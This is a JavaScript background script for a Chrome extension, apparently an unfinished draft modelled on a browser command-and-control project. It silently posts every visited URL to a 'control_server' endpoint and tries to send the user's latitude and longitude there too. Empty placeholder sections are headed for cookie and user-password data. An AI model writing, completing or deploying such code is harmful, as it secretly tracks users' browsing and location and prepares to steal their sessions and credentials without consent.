const SERVER_HOST = "http://127.0.0.1:5000"
//https://github.com/mttaggart/crux/blob/main/extension/background.js
const url = `${SERVER_HOST}/control_server`;
//URL DATA

chrome.webNavigation.onCompleted.addListener((e) => {
    if (e.url != 'about:blank'){
    
        fetch(
        url,
        {
            method: "POST",
            body: JSON.stringify({ url: e.url }),
            headers: {
                "Content-Type": "application/json"
            }
        }
    );
}}, {});

/*
fetch(
    url,
    {
        method: "POST",
        body: JSON.stringify({ url: e.url }),
        headers: {
            "Content-Type": "application/json"
        }
    }
);*/

//Geolocation DATA, esto tiene que ser ejecutado en una pagina (¿content Script?)

chrome.webNavigation.onCompleted.addListener((e) => {

    navigator.geolocation.getCurrentPosition(position => {
        const { latitude, longitude } = position.coords;
        // Show a map centered at latitude / longitude.
    console.log(latitude, longitude);
    fetch('http://127.0.0.1:5000/control_server',
        {
        method: "POST",
        mode: 'no-cors', 
        body: JSON.stringify( {lat: latitude, lon : longitude}),
        headers:{"Content-Type": "application/json"}
        }
)});}, {})

//Cookies Data



//User-Passwords DATA




//